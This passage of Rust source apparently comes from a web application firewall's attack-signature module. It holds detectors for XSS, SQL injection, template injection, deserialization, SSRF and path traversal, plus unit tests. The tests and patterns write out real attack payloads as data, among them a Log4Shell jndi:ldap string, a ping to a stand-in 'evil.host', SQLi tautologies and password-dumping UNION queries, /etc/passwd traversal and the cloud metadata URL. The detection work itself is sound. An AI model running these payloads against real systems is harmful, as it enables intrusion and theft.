        .expect("aho-corasick build cannot fail with valid UTF-8 needles")
});

/// An HTML tag anywhere in the value (`<svg onload=…>`, `"><img …`) — the
/// structural marker of a payload prepared for markup execution.
static HTML_TAG_STRUCTURE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)<\s*\w{1,32}[^>]{0,200}>"#).unwrap());

/// Does the value carry HTML tag structure around the script-URI hit?
/// An injection payload needs a tag context to execute (`<svg onload=…>`,
/// `"><img src=x onerror=…>`). A script-URI quoted inside a larger
/// non-markup string — telemetry beacons re-serializing DOM attributes as
/// JSON, CSP violation reports, link dumps — is collected data and shows no
/// tag structure. Whether a bare (container-less) script URI is treated as
/// an attack is a *source* decision for the engine: a `?url=javascript:…`
/// query value is a reflected-XSS shape, a body field is collection surface.
pub fn xss_script_uri_html_shaped(input: &str) -> bool {
    HTML_TAG_STRUCTURE.is_match(input)
}

/// Detect XSS by looking for HTML tags / event handlers / dangerous URIs in
/// contexts that should not contain them.
///
/// Inputs rejected by the keyword prefilter return an empty fingerprint;
/// callers only inspect the fingerprint when `is_xss` is true.
pub fn detect_xss(input: &str) -> (bool, String) {
    if input.len() < 3 {
        return (false, String::new());
    }
    // See `detect_sqli` for why non-ASCII input bypasses the prefilter.
    if input.is_ascii() && !XSS_PREFILTER.is_match(input) {
        return (false, String::new());
    }
    let lower = input.to_ascii_lowercase();
    let mut hits: Vec<&'static str> = Vec::with_capacity(4);

    if XSS_SCRIPT_TAG.is_match(&lower) {
        hits.push("script-tag");
    }
    if XSS_EVENT_HANDLER.is_match(&lower) {
        hits.push("event-handler");
    }
    if XSS_JS_URI.is_match(&lower) {
        hits.push("js-uri");
    }
    if XSS_DANGEROUS_TAG.is_match(&lower) {
        hits.push("dangerous-tag");
    }
    if XSS_DATA_URI.is_match(&lower) {
        hits.push("data-uri");
    }
    if XSS_STYLE_EXPR.is_match(&lower) {
        hits.push("style-expr");
    }
    if XSS_HTML_COMMENT_BREAK.is_match(&lower) {
        hits.push("html-context-break");
    }
    if XSS_DOM_CHAIN.is_match(&lower) {
        hits.push("dom-chain");
    }

    let is_xss = !hits.is_empty();
    let fingerprint = if hits.is_empty() {
        String::new()
    } else {
        format!("xss|{}", hits.join(","))
    };
    (is_xss, fingerprint)
}

static DESER_PHP_OBJECT: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\bO:\s*\d+\s*:\s*["']"#).unwrap());
static DESER_PHP_PAIR: Lazy<Regex> = Lazy::new(|| {
    // Two consecutive serialized members (`s:11:"avatar_link";s:16:"…"`) —
    // a single `s:N:"…"` can appear inside logged/quoted content, the pair
    // is the serialized record shape.
    Regex::new(r#"\b[sia]\s*:\s*\d+\s*:\s*["'][^"']{0,256}["']\s*;\s*[sia]\s*:\s*\d+\s*:\s*["']"#)
        .unwrap()
});
static DESER_OGNL_CALL: Lazy<Regex> = Lazy::new(|| {
    // Static-class invocation `@java.lang.Runtime@getRuntime(…)` or a
    // value-stack assignment into one (`#ctx=@java.lang.System@…`).
    Regex::new(r#"@[A-Za-z][\w.]*@[A-Za-z_]\w*\s*\("#).unwrap()
});
static DESER_JAVA_MAGIC: Lazy<Regex> = Lazy::new(|| {
    // Java ObjectStream magic `AC ED 00 05` percent-transported in a query:
    // the byte-restoring decoder surfaces those bytes as Latin-1 text
    // (U+00AC U+00ED NUL U+0005), which neither the hex-text needle for the
    // same magic nor the base64 transport needle can ever see. Requiring the
    // `sr` class-descriptor marker that follows keeps the shape tied to a
    // real serialized stream.
    Regex::new(r"\x{AC}\x{ED}\x{00}\x{05}sr").unwrap()
});

/// Structural deserialization / expression-language shapes that carry no
/// single literal: PHP serialized records, OGNL static calls and the Java
/// ObjectStream magic. Returns the shape name for logging.
pub fn detect_deser_shape(input: &str) -> Option<&'static str> {
    if input.len() < 8 {
        return None;
    }
    if input.contains('\u{ac}') && DESER_JAVA_MAGIC.is_match(input) {
        return Some("java-serialized-magic");
    }
    if DESER_OGNL_CALL.is_match(input) {
        return Some("ognl-static-call");
    }
    if DESER_PHP_OBJECT.is_match(input) {
        return Some("php-serialized-object");
    }
    if DESER_PHP_PAIR.is_match(input) {
        return Some("php-serialized-record");
    }
    None
}

// ---------------------------------------------------------------------------
// Structural expression / template injection detection
// ---------------------------------------------------------------------------

/// Detect expression-language and template injection by *structure*, not by
/// keyword: a `${…}` / `{{…}}` / `{%…%}` / `<%=…%>` container counts as an
/// injection attempt only when its content shows interpreter-facing shape —
/// a method call, arithmetic or comparison operators, a deep accessor chain,
/// a `new` expression, or another nested container. A bare identifier like
/// `${filename}` is templating, not an attack, and stays clean.
///
/// Returns the container kind that fired, for logging.
pub fn detect_expr_injection(input: &str) -> Option<&'static str> {
    // Cheap containment prefilter; the four scans are memchr-fast.
    if !(input.contains("${")
        || input.contains("{{")
        || input.contains("{%")
        || input.contains("<%="))
    {
        return None;
    }
    const CONTAINERS: &[(&str, &str, &str)] = &[
        ("${", "}", "el"),
        ("{{", "}}", "template"),
        ("{%", "%}", "template-stmt"),
        ("<%=", "%>", "jsp"),
    ];
    for (opener, closer, kind) in CONTAINERS {
        let mut from = 0usize;
        while let Some(rel) = input[from..].find(opener) {
            let start = from + rel + opener.len();
            let Some(end_rel) = input[start..].find(closer) else {
                break;
            };
            let inner = &input[start..start + end_rel];
            if !inner.is_empty()
                && inner.len() <= 256
                && is_structural_expr(inner)
            {
                return Some(kind);
            }
            from = start + end_rel;
        }
    }
    None
}

/// Structural features that separate an evaluated expression from a literal
/// placeholder. Deliberately conservative: `/` and `-` are excluded from the
/// operator set (URL paths and hyphenated names are everywhere), and a
/// two-segment accessor chain (`user.name`) is too common in honest
/// templating to flag.
fn is_structural_expr(inner: &str) -> bool {
    // Expression payloads are printable ASCII by construction. A high-entropy
    // binary body (log dumps, encrypted blobs) carries `${X(` or `${a=b}`
    // coincidences at rates near 1.0 over a 100KB scan, so container content
    // that is not clean printable text is collected data, not an injection.
    if !inner.bytes().all(|c| c.is_ascii_graphic() || c == b' ') {
        return false;
    }
    // A nested container is evaluation by construction (${jndi:${sys:…}}).
    if inner.contains("${") || inner.contains("{{") || inner.contains("{%") {
        return true;
    }
    let bytes = inner.as_bytes();
    // Method or function call: identifier immediately followed by `(`.
    for w in bytes.windows(2) {
        if w[1] == b'(' && (w[0].is_ascii_alphanumeric() || w[0] == b'_') {
            return true;
        }
    }
    // Arithmetic / comparison / assignment operators between the braces
    // ({{7*7}}, ${a=b}, {% if x > 1 %}).
    if bytes.iter().any(|&c| {
        matches!(
            c,
            b'+' | b'*' | b'%' | b'|' | b'^' | b'<' | b'>' | b'=' | b'!'
        )
    }) {
        return true;
    }
    // Deep accessor chain: three or more dotted segments
    // (config.__class__.__init__.__globals__).
    if inner.split('.').filter(|s| !s.is_empty()).count() >= 3 {
        return true;
    }
    // Object construction: `new` as a standalone word.
    if inner.split_whitespace().any(|w| w == "new") {
        return true;
    }
    false
}

static JS_BRACKET_CALL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        // Call-paren tail stays content-agnostic (`x[y](…`, bare or quoted)
        // — a real invocation is strong signal. A chained-bracket tail is
        // only signal when the index is a quoted string
        // (`this["constructor"]…`); bare chains like `subPayType[deduct][]`
        // are form-array parameter names, not property access.
        r#"\b\w+\[[^\]\r\n]{1,48}\]\s*(?:\(|\[\s*['"][^'"\]\r\n]{1,48}['"]\s*\])"#,
    )
    .unwrap()
});

static SQLI_UNION_BREAK: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)['"`]\s*union\b"#).unwrap());
static SQLI_UNION_CONST: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)union[\s/+]{1,8}select[\s/+]{0,4}(?:[\d('"*]|null\b)"#)
        .unwrap()
});
static SQLI_STMT_MARKER: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)(?:--|/\*|(?:^|\s)#)|\bfrom\b"#).unwrap());

/// Does a `union select` occurrence inside `input` look like an actual
/// injected statement rather than a search phrase quoting the keywords?
/// A real statement carries at least one of: a quote breaking out right
/// before `union`, a comment terminator, a `from` clause, or a constant
/// probe list (`union select 1,2,3` / `null,null,*`). A search query like
/// `site:x.com union select 关键字怎么用` has none of those.
pub fn sqli_union_statement_shaped(input: &str) -> bool {
    SQLI_UNION_BREAK.is_match(input)
        || SQLI_UNION_CONST.is_match(input)
        || SQLI_STMT_MARKER.is_match(input)
}

static SQLI_INTO_FILE_TARGET: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)into\s+(?:out|dump)file\s*['\"`]"#).unwrap()
});

/// Does an `INTO OUTFILE` / `INTO DUMPFILE` occurrence look like an actual
/// statement (a quoted file target follows) rather than a search phrase
/// quoting the keywords (`…how to use into outfile`)? A real exfiltration
/// needs a destination path, which is virtually always quoted.
pub fn sqli_into_file_statement_shaped(input: &str) -> bool {
    SQLI_INTO_FILE_TARGET.is_match(input)
}

/// A quote closed in front of the tautology's operator — the shape a
/// quoted-context injection needs in order to get out of the string literal
/// and into SQL: `1' OR 1=1`, `" OR "1"="1`, `') or ('1'='1`. Prose that
/// merely mentions `1=1` has no reason to break a quote first.
static SQLI_TAUTOLOGY_QUOTE_BREAK: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)['"`][\s)]*(?:\|\||&&|\bor\b|\band\b)"#).unwrap()
});

/// SQL punctuation a sentence about arithmetic does not produce: a boolean
/// operator, or an operator followed straight into a quote or a parenthesis
/// (the sub-term / cast shapes).
static SQLI_TAUTOLOGY_STRUCTURE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:\|\||&&)|(?:\bor\b|\band\b)\s*[('"`]|;"#).unwrap()
});

/// Does a tautology occurrence look like an injected statement rather than a
/// sentence quoting `1=1`?
///
/// Used to decide whether a *long* value still scores: real probes are short,
/// so length alone used to demote every tautology past 32 bytes, and padding
/// a payload with filler to cross that line was free. The two shapes below
/// are what a working injection needs and what prose lacks.
pub fn sqli_tautology_statement_shaped(input: &str) -> bool {
    SQLI_TAUTOLOGY_QUOTE_BREAK.is_match(input)
        || SQLI_TAUTOLOGY_STRUCTURE.is_match(input)
}

/// How many distinct long words a value must carry before a tautology inside
/// it is read as a quotation of arithmetic rather than a probe.
const TAUTOLOGY_PROSE_WORDS: usize = 3;

/// Distinct runs of four or more ASCII letters in `input`.
///
/// Letters only, and only when the run stands alone: a run glued to a digit
/// or an underscore (`aaaaaaaa1`, `col_name`) is an identifier or a pad, not
/// a word. Distinct as well, because a payload padded by repeating one SQL
/// keyword is not prose however many times the keyword appears.
fn distinct_long_words(input: &str) -> usize {
    /// An identifier character: a letter run touching one of these is part
    /// of a larger token rather than a word of its own.
    fn glued_to_identifier(byte: Option<&u8>) -> bool {
        byte.is_some_and(|b| b.is_ascii_digit() || *b == b'_')
    }

    let bytes = input.as_bytes();
    let mut words: Vec<&str> = Vec::new();
    let mut index = 0;
    while index < bytes.len() {
        if !bytes[index].is_ascii_alphabetic() {
            index += 1;
            continue;
        }
        let start = index;
        while index < bytes.len() && bytes[index].is_ascii_alphabetic() {
            index += 1;
        }
        let word = &input[start..index];
        let standalone =
            start == 0 || !glued_to_identifier(bytes.get(start - 1));
        if standalone
            && !glued_to_identifier(bytes.get(index))
            && word.len() >= 4
            && !words.contains(&word)
        {
            words.push(word);
        }
    }
    words.len()
}

/// Is the tautology part of a sentence?
///
/// `1 and 1=1 is a very basic mathematical operation` carries four distinct
/// English-looking words and reads as a quotation of arithmetic; a payload
/// padded to slip past a length test carries SQL vocabulary and repetition
/// instead. Both tests have to hold before a long tautology is written off as
/// a search phrase — the demotion is now narrower than the length test it
/// replaces, never wider.
pub fn tautology_sits_in_prose(input: &str) -> bool {
    distinct_long_words(input) >= TAUTOLOGY_PROSE_WORDS
}

static SCRIPT_TAG_ATTR: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)<script[\s+][^>]*>").unwrap());
static SCRIPT_TAG_COMPACT: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)<script>").unwrap());

/// Does a `<script` occurrence in `input` actually open a tag? Two real-tag
/// shapes exist: with attributes (`<script src=…>`, `<script+src=…>`) and the
/// compact opener (`<script>alert(…)`). A `<script` glued to punctuation or
/// end-of-value (`1<script`, `"binary<script" is incorrect`) is a search
/// phrase or an escaped telemetry value, not markup an interpreter runs.
/// The compact opener is only reported when `compact_allowed` — reflected
/// surfaces (query/path/header/cookie). Body payloads carrying a bare
/// `<script>` are overwhelmingly legitimate HTML uploads (playground files,
/// stored pages), which the attribute shape still covers.
pub fn xss_script_tag_shaped(input: &str, compact_allowed: bool) -> bool {
    SCRIPT_TAG_ATTR.is_match(input)
        || (compact_allowed && SCRIPT_TAG_COMPACT.is_match(input))
}

/// Does a Referer/User-Agent value embed executable markup context — a
/// script tag, an event-handler attribute, or a script URI? Browsers only
/// ever send well-formed URLs here; such a value was authored by an attack
/// tool reflecting a previous probe, so the meta-header demotion must not
/// apply to it (a Referer *quoting* prose with "union select" still does).
pub fn xss_markup_shaped(input: &str) -> bool {
    SCRIPT_TAG_ATTR.is_match(input)
        || SCRIPT_TAG_COMPACT.is_match(input)
        || XSS_EVENT_HANDLER.is_match(input)
        || XSS_JS_URI.is_match(input)
}

/// A tautology probe hidden inside one URL path segment
/// (`/api/products/123 and 1=1/reviews`). libinjection skips Path as a
/// source (paths are stored-URL syntax, not attacker-typed strings), so
/// segments are checked individually with the same ≤32B prose bound the
/// value gate applies — a probe segment is tiny, quoted prose is long.
pub fn path_tautology_segment(path: &str) -> bool {
    path.split('/').any(|seg| {
        (5..=32).contains(&seg.len()) && {
            let (is_sqli, fp) = detect_sqli(seg);
            is_sqli && fp.contains("tautology")
        }
    })
}

/// Backtick-interleaved command names (`;wh``oami`, `|ca``t /e`): an empty
/// backtick pair glued inside a command word behind a shell operator. Honest
/// text keeps whitespace before a backtick span, so the interleaved shape is
/// authored obfuscation against literal `` `id` ``-style signatures.
static CI_BACKTICK_INTERLEAVED: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?:;|\||&&|&)\s*[a-z_]{1,12}`{2}[a-z_]").unwrap()
});

pub fn ci_backtick_interleaved(input: &str) -> bool {
    CI_BACKTICK_INTERLEAVED.is_match(input)
}

/// Protocol CRLF smuggling: an SSRF-exploit scheme (`ldap://`, `gopher://`,
/// `dict://`) carrying a decoded newline. These schemes exist to speak raw
/// wire protocols, and a newline inside them is a framed request injection —
/// never a benign URL.
pub fn ssrf_protocol_smuggling(input: &str) -> bool {
    (input.contains("ldap://")
        || input.contains("gopher://")
        || input.contains("dict://"))
        && (input.contains('\n') || input.contains('\r'))
}

/// Backslash-joined remote include (`dir=http\..\admin\...`): a scheme
/// prefix followed by backslash traversal — RFI and Windows-path traversal
/// composed into one payload. Backslash traversal alone is PT-002; the
/// scheme prefix in front of it marks an inclusion attempt.
static PT_REMOTE_BACKSLASH: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)(?:https?|ftp)\\+\.\.\\").unwrap());

pub fn pt_remote_backslash_include(input: &str) -> bool {
    PT_REMOTE_BACKSLASH.is_match(input)
}

/// Python chr() codepoint chain: two `chr(N)` calls joined by an operator
/// (`chr(121)+chr(101)+chr(115)` → "yes"). Assembling evaluation input from
/// codepoints is an injection-building shape; benign traffic carries no
/// chr() chains at all.
static CI_CHR_CHAIN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)chr\(\d{1,3}\)\s*[+%&|^.]\s*chr\(\d{1,3}\)").unwrap()
});

pub fn ci_chr_chain(input: &str) -> bool {
    CI_CHR_CHAIN.is_match(input)
}

/// Double executable extension at the end of a path (`apache.php.jpeg`):
/// the classic Apache/IIS multi-extension parsing chain — the upload wins a
/// benign image suffix while the handler still executes the PHP/ASP part.
/// Anchored to the path tail so ordinary dot-separated route segments in the
/// middle cannot fire; a script's real extension is never followed by a
/// second suffix unless a parser quirk is the point.
// Only server-executable script extensions count: a double extension like
// `shell.php.jpeg` is the classic upload-bypass form. Desktop-binary names
// (exe/dll/sh/bat) are excluded — `vendor.dll.js` is standard webpack DLL
// bundle output and a much larger benign population than an attack surface.
static PT_DOUBLE_EXEC_EXT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\.(?:php\d?|phtml|asp|aspx|jsp|jspx|cgi|pl|ashx)\.[a-z0-9]{1,5}$",
    )
    .unwrap()
});

pub fn pt_double_exec_extension(path: &str) -> bool {
    PT_DOUBLE_EXEC_EXT.is_match(path)
}

static CRLF_HEADER_SHAPE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)[\r\n]{2,}\s*[\w-]{1,32}\s*:").unwrap());

/// Does a CRLF occurrence inside `input` precede a header-name shape
/// (`…\r\nX-Foo: bar`, including mixed `\r\r\n\n` evasion)? That is
/// response-splitting material. Bare multi-line text — a multi-line form
/// input echoed into a query value, prose — is not.
pub fn crlf_header_injection_shaped(input: &str) -> bool {
    CRLF_HEADER_SHAPE.is_match(input)
}

/// Detect JavaScript bracket-call invocation (`parent['eval'](…)`,
/// `this["constructor"]["constructor"](…)`), a shape plain keyword needles
/// never see because the callee name sits inside brackets and is frequently
/// hex-escaped (`\x65val`). Structural, not lexical: an identifier followed
/// by a bracketed name and then another bracket (chain) or a call paren.
///
/// Strict-only: honest HTTP traffic essentially never carries this shape.
pub fn detect_js_call(input: &str) -> bool {
    JS_BRACKET_CALL.is_match(input)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn engine_finds_path_traversal() {
        let e = SignatureEngine::new();
        let hits = e.scan("../../etc/passwd");
        assert!(hits
            .iter()
            .any(|h| h.category == AttackCategory::PathTraversal));
    }

    #[test]
    fn engine_finds_slash_less_traversal_when_masked() {
        // "../../" consumes the "/" that "/etc/passwd" would need; the
        // slash-less PT-013 variant is what survives the overlap.
        let e = SignatureEngine::new();
        let hits = e.scan("../../../etc/passwd%00.png");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "PT-013"));
    }

    #[test]
    fn js_call_detector_fires_on_bracket_invocation() {
        assert!(detect_js_call("parent['eval'](payload)"));
        assert!(detect_js_call(
            "this[\"constructor\"][\"constructor\"](atob('..'))()"
        ));
        assert!(detect_js_call("global[\\x65val](cmd)"));
        assert!(detect_js_call("this['constructor']['constructor']"));
        assert!(!detect_js_call("rows[0].name"));
        assert!(!detect_js_call("list[a] and list[b]"));
        // Form-array parameter names: bare chained indexes, quoted or not,
        // are never property-access invocation.
        assert!(!detect_js_call("subPayType[deduct][]"));
        assert!(!detect_js_call("subPayType['deduct'][]"));
        assert!(!detect_js_call("x[a][b] filter"));
    }

    #[test]
    fn engine_finds_ssrf_metadata() {
        let e = SignatureEngine::new();
        let hits = e.scan("http://169.254.169.254/latest/meta-data/");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "SSRF-001"));
    }

    #[test]
    fn engine_case_insensitive() {
        let e = SignatureEngine::new();
        let hits = e.scan("UNION SELECT password FROM users");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "SQL-001"));
    }

    #[test]
    fn engine_dedupes() {
        let e = SignatureEngine::new();
        let hits = e.scan("../ ../ ../");
        assert_eq!(
            hits.iter()
                .filter(|h| e.pattern_id(h.pattern) == "PT-001")
                .count(),
            1
        );
    }

    #[test]
    fn strict_profile_loads_strict_only_needles() {
        let normal =
            SignatureEngine::for_profile(WafLevel::Normal, StackSet::ALL);
        let strict =
            SignatureEngine::for_profile(WafLevel::Strict, StackSet::ALL);
        assert!(strict.pattern_count() > normal.pattern_count());
        assert!(strict
            .scan("$(ping -c 1 evil.host)")
            .iter()
            .any(|h| { strict.pattern_id(h.pattern) == "CI-102" }));
        assert!(normal
            .scan("$(ping -c 1 evil.host)")
            .iter()
            .all(|h| strict.pattern_id(h.pattern) != "CI-102"));
    }

    #[test]
    fn stack_profile_drops_other_language_needles() {
        let java = SignatureEngine::for_profile(
            WafLevel::Normal,
            StackSet::GENERIC.union(StackSet::JAVA),
        );
        assert!(java
            .scan("aced0005 01 02")
            .iter()
            .any(|h| java.pattern_id(h.pattern) == "DZ-001"));
        assert!(java
            .scan("unserialize($_GET[x])")
            .iter()
            .all(|h| java.pattern_id(h.pattern) != "DZ-010"));
        let php = SignatureEngine::for_profile(
            WafLevel::Normal,
            StackSet::GENERIC.union(StackSet::PHP),
        );
        assert!(php
            .scan("test unserialize(:__wakeup)")
            .iter()
            .any(|h| php.pattern_id(h.pattern) == "DZ-005"));
    }

    #[test]
    fn log4shell_query_payload_hits_critical_needle() {
        // Regression guard for the benchmark miss: the payload lives in the
        // query string and must reach the ${jndi: needle.
        let e = SignatureEngine::for_profile(WafLevel::Normal, StackSet::ALL);
        let hits =
            e.scan("action=${jndi:ldap://${sys:java.version}.example.com}");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "TI-006"));
        assert!(hits.iter().any(|h| h.severity >= 5));
    }

    #[test]
    fn detect_expr_injection_structural_payloads() {
        assert!(detect_expr_injection("{{7*7}}").is_some());
        assert!(detect_expr_injection("${System.getProperty(\"user.dir\")}")
            .is_some());
        assert!(detect_expr_injection("${jndi:${sys:java.version}}").is_some());
        assert!(
            detect_expr_injection("{{config.__class__.__init__}}").is_some()
        );
        assert!(detect_expr_injection("${new java.lang.Runtime}").is_some());
    }

    #[test]
    fn detect_expr_injection_ignores_innocent_templating() {
        assert!(detect_expr_injection("${filename}").is_none());
        assert!(detect_expr_injection("{{user.name}}").is_none());
        assert!(detect_expr_injection("plain text").is_none());
        assert!(detect_expr_injection("a/b/c${x}/d").is_none());
    }

    #[test]
    fn detect_sqli_or_1_eq_1() {
        let (hit, _fp) = detect_sqli("' OR 1=1 --");
        assert!(hit, "tautology should be detected");
    }

    #[test]
    fn detect_sqli_union_select() {
        let (hit, fp) =
            detect_sqli("1 UNION SELECT username, password FROM users");
        assert!(hit);
        assert!(fp.contains("union-select"));
    }

    #[test]
    fn detect_sqli_drop_table() {
        let (hit, _fp) = detect_sqli("1; DROP TABLE users");
        assert!(hit);
    }

    #[test]
    fn detect_sqli_sleep() {
        let (hit, fp) = detect_sqli("1 AND SLEEP(5)");
        assert!(hit);
        assert!(fp.contains("dangerous-function"));
    }

    #[test]
    fn detect_sqli_benign_input() {
        let (hit, _fp) = detect_sqli("hello world this is a normal value");
        assert!(!hit);
    }

    #[test]
    fn detect_sqli_numeric_id() {
        let (hit, _fp) = detect_sqli("12345");
        assert!(!hit);
    }

    #[test]
    fn detect_sqli_truncated_tautology() {
        // `1' or ''='` — quote-unbalanced tautology tail (right value never
        // closes), the form the DVWA-style bench samples carry.
        let (hit, fp) = detect_sqli("1' or ''='");
        assert!(hit, "truncated tautology should fire");
        assert!(fp.contains("truncated-tautology"));
    }

    #[test]
    fn detect_sqli_bare_select_from() {
        let (hit, fp) = detect_sqli("SELECT * FROM all_tables");
        assert!(hit);
        assert!(fp.contains("bare-select"));
        let (hit2, fp2) = detect_sqli("select id,name from users");
        assert!(hit2);
        assert!(fp2.contains("bare-select"));
    }

    #[test]
    fn detect_sqli_prose_select_from_stays_clean() {
        // Prose with select/from but no column-list markers must not fire.
        let (hit, _fp) =
            detect_sqli("select your favourite item from our store");
        assert!(!hit, "prose select/from should stay clean");
    }

    #[test]
    fn detect_sqli_blind_probe_dictionary() {
        let payload = "SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN \
                       TO_CHAR(1/0) ELSE NULL END FROM dual";
        let (hit, fp) = detect_sqli(payload);
        assert!(hit);
        assert!(fp.contains("blind-probe"));
    }

    #[test]
    fn detect_sqli_comment_split_tautology() {
        let (hit, fp) =
            detect_sqli("userN\") # calendar \nOR /* areasth */\"1\"=\"1\"--");
        assert!(hit);
        assert!(fp.contains("tautology") || fp.contains("comment-stripped"));
    }

    #[test]
    fn blind_probe_prose_stays_clean() {
        // "in the case when … then" prose must not fire the generic
        // CASE…WHEN alternative; it lacks an SQL operator prefix.
        let (hit, _fp) = detect_sqli(
            "in the case when you feel chest pain, seek medical help \
             immediately. then, we can address the issue promptly.",
        );
        assert!(!hit, "prose case/when/then should stay clean");
    }

    #[test]
    fn tautology_prose_shape_is_recognised() {
        // Reads as a sentence: several distinct English-looking words.
        assert!(tautology_sits_in_prose(
            "1 and 1=1 is a very basic mathematical operation"
        ));
        assert!(tautology_sits_in_prose(
            "id=1 and 1=1 because the filter requires a match"
        ));
    }

    #[test]
    fn tautology_payloads_are_not_prose() {
        // SQL vocabulary and repetitions are not words a sentence is made
        // of, so a padded payload cannot claim the prose exemption.
        assert!(!tautology_sits_in_prose("and true and true and true"));
        assert!(!tautology_sits_in_prose(
            "1 OR 1=1 OR 1=1 OR 1=1 OR 1=1 OR 1=1"
        ));
        // A single long alphabetic run is a pad, not a word.
        assert!(!tautology_sits_in_prose(&format!(
            "{}1' OR '1'='1",
            "A".repeat(29)
        )));
    }

    #[test]
    fn distinct_long_words_counts_words_not_occurrences() {
        assert_eq!(0, distinct_long_words("1 OR 1=1"));
        assert_eq!(1, distinct_long_words("true true true"));
        assert_eq!(0, distinct_long_words("aaaaaaaa1"));
        // Letters glued to a digit are not a word.
        assert_eq!(0, distinct_long_words("lorem1 ipsum2 dolor3"));
        assert_eq!(2, distinct_long_words("match the pattern"));
    }

    #[test]
    fn tautology_statement_shapes_are_recognised() {
        // A quote closed in front of the operator: what a quoted-context
        // injection needs and prose never has.
        for payload in [
            "1' OR 1=1",
            "1' OR '1'='1",
            "prefix' and '1'='1",
            "\" OR \"1\"=\"1",
            "') or ('1'='1",
            "1'||'1'='1",
        ] {
            assert!(
                sqli_tautology_statement_shaped(payload),
                "{payload} should read as a statement"
            );
        }
        // SQL punctuation a sentence does not use.
        assert!(sqli_tautology_statement_shaped("1 and 1=1; something"));
        assert!(sqli_tautology_statement_shaped("1 or (1=1)"));

        // The inline-tautology needle form is not one of those shapes.
        assert!(!sqli_tautology_statement_shaped("1 and 1=1"));
    }

    #[test]
    fn bare_select_full_query_stays_clean() {
        // A complete query (WHERE/LIMIT) passed as a parameter value is the
        // legitimate-query class — lexically indistinguishable, skipped.
        let (hit, _fp) = detect_sqli(
            "SELECT * FROM users WHERE users.slug = 'user411' LIMIT 1;",
        );
        assert!(!hit, "complete WHERE query should stay clean");
    }

    #[test]
    fn tautology_lucene_filter_stays_clean() {
        // word = string comparisons (API/Lucene filter syntax) are not
        // tautologies; only numeric self-equality and quoted-token pairs.
        let (hit, _fp) = detect_sqli(
            "title=\"sql\" && product=\"wordpress\" || author==\"CT Stack\"",
        );
        assert!(!hit, "filter equality should stay clean");
    }

    #[test]
    fn tautology_quoted_pair_still_detected() {
        let (hit, fp) = detect_sqli("or \"1\"=\"1\"--");
        assert!(hit);
        assert!(fp.contains("tautology"));
    }

    #[test]
    fn quote_keyword_contraction_stays_clean() {
        // Apostrophe inside a word followed by a keyword much later in a
        // long list must not fire; the keyword must sit behind the quote.
        let (hit, _fp) =
            detect_sqli("could n't select a favorite color from the list");
        assert!(!hit, "contraction + keyword should stay clean");
    }

    #[test]
    fn quote_keyword_quote_break_still_detected() {
        let (hit, fp) = detect_sqli("x'); exec('id')");
        assert!(hit);
        assert!(fp.contains("quote-keyword") || fp.contains("stacked-query"));
    }

    #[test]
    fn bool_subquery_blind_sqli_detected() {
        // PortSwigger boolean-blind family recovered after the tautology
        // tightening: operator-prefixed subqueries and `N=(SELECT …)`.
        for payload in [
            "xyz' AND (SELECT 'a' FROM users LIMIT 1)='a",
            "x' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
            "1 AND 1=(SELECT CAST((SELECT version()) AS integer)) -- ') = true",
            "SELECT 'foo' WHERE 1 = (SELECT 'secret')",
        ] {
            let (hit, _fp) = detect_sqli(payload);
            assert!(hit, "bool-subquery should fire: {payload}");
        }
    }

    #[test]
    fn bool_subquery_prose_stays_clean() {
        // `and select` / `or select` alone is an ordinary imperative and
        // must not fire; only paren- or comparison-bound subqueries count.
        let (hit, _fp) = detect_sqli(
            "go to settings and select the item, or select everything",
        );
        assert!(!hit, "prose and/or select should stay clean");
    }

    #[test]
    fn detect_xss_dom_chain() {
        let (hit, fp) = detect_xss(
            "toString.constructor.prototype.toString=toString.constructor.\
             prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)",
        );
        assert!(hit);
        assert!(fp.contains("dom-chain"));
    }

    #[test]
    fn detect_xss_constructor_name_read_stays_clean() {
        let (hit, _fp) = detect_xss("x.constructor.name");
        assert!(!hit, "a single constructor read is not a chain");
    }

    #[test]
    fn detect_deser_php_and_ognl() {
        assert_eq!(
            detect_deser_shape("O:8:\"stdClass\":2:{s:3:\"foo\";i:1;}"),
            Some("php-serialized-object")
        );
        assert_eq!(
            detect_deser_shape(
                "s:11:\"avatar_link\";s:16:\"L2V0Yy9wYXNzd2Q=\""
            ),
            Some("php-serialized-record")
        );
        assert_eq!(
            detect_deser_shape(
                "#url=(@java.lang.System@getProperty('\\u0075'))"
            ),
            Some("ognl-static-call")
        );
        assert_eq!(detect_deser_shape("a normal value"), None);
        assert_eq!(detect_deser_shape("x.constructor.name"), None);
    }

    #[test]
    fn detect_deser_java_magic_in_latin1_restored_bytes() {
        // `?s=%ac%ed%00%05%73%72...` percent-decodes to the raw ObjectStream
        // bytes; the byte-restoring decoder maps them through Latin-1, so the
        // shape check must look for the char sequence — the hex-text needle
        // for the same magic can never see it.
        let v =
            "¬í\u{0}\u{5}sr\u{0}\u{1a}com.ct.araleii.test.Person\u{78}\u{70}";
        assert_eq!(detect_deser_shape(v), Some("java-serialized-magic"));
        assert_eq!(detect_deser_shape("¬í truncated stream"), None);
    }

    #[test]
    fn detect_xss_script() {
